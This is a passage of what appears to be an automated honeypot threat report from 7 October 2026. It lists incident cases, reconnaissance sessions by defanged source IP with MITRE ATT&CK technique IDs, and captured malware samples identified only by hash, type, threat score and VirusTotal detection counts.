| IR-5981d4c46953 | HIGH | `176.53.159[.]196` | 2026-10-07 09:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e745c557c016 | HIGH | `45.141.26[.]3` | 2026-10-07 09:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-56811bcf8708 | HIGH | `130.12.180[.]51` | 2026-10-07 09:43 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-d0e050f20ac4 | HIGH | `195.178.110[.]218` | 2026-10-07 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-98f6d8266672 | HIGH | `195.178.110[.]227` | 2026-10-07 10:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-33d34261580d | HIGH | `109.160.32[.]144` | 2026-10-07 10:20 | Y | 1 | 0 | `T1078 · T1592` |
| IR-287f40c32d01 | HIGH | `176.53.159[.]196` | 2026-10-07 10:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-26adf87a95cc | HIGH | `118.38.44[.]223` | 2026-10-07 10:47 | Y | 4 | 0 | `T1078` |
| IR-48a4450d6494 | HIGH | `46.101.137[.]209` | 2026-10-07 10:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6c9f029c8e4b | HIGH | `46.101.137[.]209` | 2026-10-07 10:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-70206f049cc2 | HIGH | `118.38.44[.]223` | 2026-10-07 10:49 | Y | 6 | 0 | `T1078` |
_… 72 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `132.148.30[.]167` | **2** | 2026-10-07 03:00 | 2026-10-07 04:06 | 1m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]86` | **2** | 2026-10-07 07:35 | 2026-10-07 08:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-07 07:40 | 2026-10-07 08:19 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `94.154.43[.]69` | **2** | 2026-10-07 13:55 | 2026-10-07 15:40 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.66.165[.]103` | 1 | 2026-10-07 10:34 | 2026-10-07 10:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `102.220.163[.]98` | 1 | 2026-10-07 05:22 | 2026-10-07 05:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.220.163[.]98` | 1 | 2026-10-07 08:22 | 2026-10-07 08:22 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.220.163[.]98` | 1 | 2026-10-07 11:23 | 2026-10-07 11:23 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.220.163[.]98` | 1 | 2026-10-07 14:23 | 2026-10-07 14:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.67.244[.]24` | 1 | 2026-10-07 05:32 | 2026-10-07 05:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-10-07 03:56 | 2026-10-07 03:56 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.229.125[.]232` | 1 | 2026-10-07 12:12 | 2026-10-07 12:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `104.200.30[.]87` | 1 | 2026-10-07 11:29 | 2026-10-07 11:30 | 31s | 0 | `T1592` | 🟢 LOW |
| `106.12.84[.]220` | 1 | 2026-10-07 03:37 | 2026-10-07 03:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.75.214[.]209` | 1 | 2026-10-07 04:15 | 2026-10-07 04:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]102` | 1 | 2026-10-07 05:32 | 2026-10-07 05:32 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]114` | 1 | 2026-10-07 12:06 | 2026-10-07 12:06 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]144` | 1 | 2026-10-07 10:19 | 2026-10-07 10:20 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]150` | 1 | 2026-10-07 16:03 | 2026-10-07 16:03 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.45.29[.]88` | 1 | 2026-10-07 12:02 | 2026-10-07 12:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.103.133[.]57` | 1 | 2026-10-07 05:34 | 2026-10-07 05:35 | 10s | 0 | `T1592` | 🟢 LOW |
| `115.191.79[.]153` | 1 | 2026-10-07 03:46 | 2026-10-07 03:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.240[.]6` | 1 | 2026-10-07 07:00 | 2026-10-07 07:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.196.114[.]236` | 1 | 2026-10-07 11:03 | 2026-10-07 11:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.196.119[.]108` | 1 | 2026-10-07 15:31 | 2026-10-07 15:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.230.142[.]3` | 1 | 2026-10-07 15:28 | 2026-10-07 15:28 | 50s | 0 | `T1592` | 🟢 LOW |
| `120.27.122[.]227` | 1 | 2026-10-07 09:51 | 2026-10-07 09:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `122.97.209[.]74` | 1 | 2026-10-07 14:02 | 2026-10-07 14:02 | 12s | 0 | `T1592` | 🟢 LOW |
| `124.106.222[.]113` | 1 | 2026-10-07 09:31 | 2026-10-07 09:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]127` | 1 | 2026-10-07 07:59 | 2026-10-07 07:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-07 06:01 | 2026-10-07 06:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-07 09:49 | 2026-10-07 09:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-07 16:03 | 2026-10-07 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-07 08:37 | 2026-10-07 08:38 | 50s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-07 14:15 | 2026-10-07 14:16 | 45s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-07 03:14 | 2026-10-07 03:15 | 49s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]194` | 1 | 2026-10-07 04:09 | 2026-10-07 04:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.126[.]104` | 1 | 2026-10-07 15:36 | 2026-10-07 15:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-10-07 04:55 | 2026-10-07 04:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.227.55[.]4` | 1 | 2026-10-07 16:40 | 2026-10-07 16:40 | 1s | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]13` | 1 | 2026-10-07 07:09 | 2026-10-07 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.161.220[.]200` | 1 | 2026-10-07 12:28 | 2026-10-07 12:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.104.140[.]2` | 1 | 2026-10-07 14:36 | 2026-10-07 14:36 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-07 05:40 | 2026-10-07 05:41 | 14s | 0 | `T1592` | 🟢 LOW |
| `178.178.222[.]61` | 1 | 2026-10-07 07:40 | 2026-10-07 07:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.185[.]216` | 1 | 2026-10-07 15:14 | 2026-10-07 15:16 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.243[.]197` | 1 | 2026-10-07 05:28 | 2026-10-07 05:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.107.80[.]93` | 1 | 2026-10-07 16:45 | 2026-10-07 16:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.58.65[.]40` | 1 | 2026-10-07 04:43 | 2026-10-07 04:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `188.68.93[.]250` | 1 | 2026-10-07 05:55 | 2026-10-07 05:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-07 07:43 | 2026-10-07 07:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-07 16:02 | 2026-10-07 16:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]248` | 1 | 2026-10-07 07:59 | 2026-10-07 07:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | 1 | 2026-10-07 04:54 | 2026-10-07 04:55 | 28s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.123.210[.]209` | 1 | 2026-10-07 07:07 | 2026-10-07 07:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.123.219[.]34` | 1 | 2026-10-07 07:48 | 2026-10-07 07:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-07 11:29 | 2026-10-07 11:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]227` | 1 | 2026-10-07 09:16 | 2026-10-07 09:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]228` | 1 | 2026-10-07 03:21 | 2026-10-07 03:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.26.18[.]117` | 1 | 2026-10-07 14:30 | 2026-10-07 14:30 | 12s | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]52` | 1 | 2026-10-07 10:26 | 2026-10-07 10:26 | 15s | 0 | `T1592` | 🟢 LOW |
| `2.55.69[.]224` | 1 | 2026-10-07 06:28 | 2026-10-07 06:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]53` | 1 | 2026-10-07 14:35 | 2026-10-07 14:35 | 6s | 0 | `T1592` | 🟢 LOW |
| `200.120.155[.]115` | 1 | 2026-10-07 04:01 | 2026-10-07 04:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.59.78[.]79` | 1 | 2026-10-07 15:38 | 2026-10-07 15:38 | 10s | 0 | `T1592` | 🟢 LOW |
| `202.107.164[.]91` | 1 | 2026-10-07 03:15 | 2026-10-07 03:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `206.183.111[.]36` | 1 | 2026-10-07 11:25 | 2026-10-07 11:26 | 57s | 0 | `T1592` | 🟢 LOW |
| `209.99.190[.]110` | 1 | 2026-10-07 11:24 | 2026-10-07 11:24 | 0s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.102.39[.]12` | 1 | 2026-10-07 03:52 | 2026-10-07 03:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.230.86[.]77` | 1 | 2026-10-07 12:55 | 2026-10-07 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.140.138[.]90` | 1 | 2026-10-07 12:59 | 2026-10-07 12:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.180.166[.]214` | 1 | 2026-10-07 04:28 | 2026-10-07 04:28 | 6s | 0 | `T1592` | 🟢 LOW |
| `222.186.135[.]8` | 1 | 2026-10-07 04:02 | 2026-10-07 04:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `23.94.206[.]233` | 1 | 2026-10-07 03:22 | 2026-10-07 03:22 | 30s | 0 | `T1592` | 🟢 LOW |
| `23.94.206[.]233` | 1 | 2026-10-07 08:59 | 2026-10-07 08:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-07 05:56 | 2026-10-07 05:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-07 14:37 | 2026-10-07 14:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.202.88[.]69` | 1 | 2026-10-07 07:09 | 2026-10-07 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.52.154[.]163` | 1 | 2026-10-07 07:53 | 2026-10-07 07:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.78.103[.]39` | 1 | 2026-10-07 07:53 | 2026-10-07 07:53 | 11s | 0 | `T1592` | 🟢 LOW |
| `36.103.243[.]179` | 1 | 2026-10-07 15:17 | 2026-10-07 15:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.111.40[.]138` | 1 | 2026-10-07 12:31 | 2026-10-07 12:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.213.69[.]14` | 1 | 2026-10-07 13:44 | 2026-10-07 13:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.50.134[.]86` | 1 | 2026-10-07 03:41 | 2026-10-07 03:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.124.123[.]24` | 1 | 2026-10-07 10:44 | 2026-10-07 10:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.124.187[.]46` | 1 | 2026-10-07 11:52 | 2026-10-07 11:52 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]70` | 1 | 2026-10-07 11:35 | 2026-10-07 11:35 | 5s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]71` | 1 | 2026-10-07 11:36 | 2026-10-07 11:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]72` | 1 | 2026-10-07 11:35 | 2026-10-07 11:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.129[.]73` | 1 | 2026-10-07 11:35 | 2026-10-07 11:35 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-10-07 07:34 | 2026-10-07 07:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.8[.]221` | 1 | 2026-10-07 09:33 | 2026-10-07 09:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.55[.]211` | 1 | 2026-10-07 03:29 | 2026-10-07 03:29 | 31s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-10-07 04:08 | 2026-10-07 04:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.171.100[.]124` | 1 | 2026-10-07 05:35 | 2026-10-07 05:36 | 6s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-07 10:02 | 2026-10-07 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.187.121[.]21` | 1 | 2026-10-07 14:18 | 2026-10-07 14:19 | 10s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-10-07 03:48 | 2026-10-07 03:48 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-10-07 06:42 | 2026-10-07 06:42 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-07 07:41 | 2026-10-07 07:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]162` | 1 | 2026-10-07 06:43 | 2026-10-07 06:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]106` | 1 | 2026-10-07 07:52 | 2026-10-07 07:53 | 19s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]141` | 1 | 2026-10-07 08:47 | 2026-10-07 08:47 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]178` | 1 | 2026-10-07 15:52 | 2026-10-07 15:52 | 18s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]35` | 1 | 2026-10-07 05:50 | 2026-10-07 05:51 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | 1 | 2026-10-07 15:51 | 2026-10-07 15:52 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]179` | 1 | 2026-10-07 08:47 | 2026-10-07 08:48 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]201` | 1 | 2026-10-07 08:48 | 2026-10-07 08:48 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]103` | 1 | 2026-10-07 15:52 | 2026-10-07 15:52 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]35` | 1 | 2026-10-07 15:52 | 2026-10-07 15:53 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]224` | 1 | 2026-10-07 03:27 | 2026-10-07 03:27 | 16s | 0 | `T1592` | 🟢 LOW |
| `68.183.206[.]245` | 1 | 2026-10-07 04:46 | 2026-10-07 04:47 | 8s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-10-07 08:34 | 2026-10-07 08:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]108` | 1 | 2026-10-07 07:59 | 2026-10-07 07:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]183` | 1 | 2026-10-07 03:24 | 2026-10-07 03:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]199` | 1 | 2026-10-07 03:24 | 2026-10-07 03:24 | 9s | 0 | `T1592` | 🟢 LOW |
| `74.82.47[.]4` | 1 | 2026-10-07 11:45 | 2026-10-07 11:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-07 11:16 | 2026-10-07 11:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-07 14:43 | 2026-10-07 14:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.130.162[.]112` | 1 | 2026-10-07 12:02 | 2026-10-07 12:02 | 3s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | 1 | 2026-10-07 16:32 | 2026-10-07 16:32 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-10-07 14:45 | 2026-10-07 14:45 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.232.238[.]69` | 1 | 2026-10-07 04:37 | 2026-10-07 04:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.242.55[.]140` | 1 | 2026-10-07 06:25 | 2026-10-07 06:25 | 13s | 0 | `T1592` | 🟢 LOW |
| `92.25.84[.]242` | 1 | 2026-10-07 12:53 | 2026-10-07 12:54 | 59s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]120` | 1 | 2026-10-07 03:05 | 2026-10-07 03:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-07 06:18 | 2026-10-07 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-07 08:29 | 2026-10-07 08:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-07 14:22 | 2026-10-07 14:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-10-07 13:29 | 2026-10-07 13:30 | 30s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]57` | 1 | 2026-10-07 16:05 | 2026-10-07 16:05 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
